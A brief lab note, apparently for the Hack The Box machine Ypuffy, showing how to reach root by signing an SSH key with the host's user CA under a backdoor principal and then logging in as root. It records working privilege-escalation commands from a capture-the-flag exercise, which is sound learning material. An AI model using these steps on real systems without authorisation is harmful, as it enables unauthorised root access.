# ssh sign login

generate signed private key

/ssh-keygen -s /home/userca/ca -n 3m3rgencyB4ckd00r -I root id_rsa

put idrsa id_rsa-cert.pub id_rsa.pub in same dir

login with ssh -i id_rsa root@127.0.0.1

hackthebox   Ypuffy
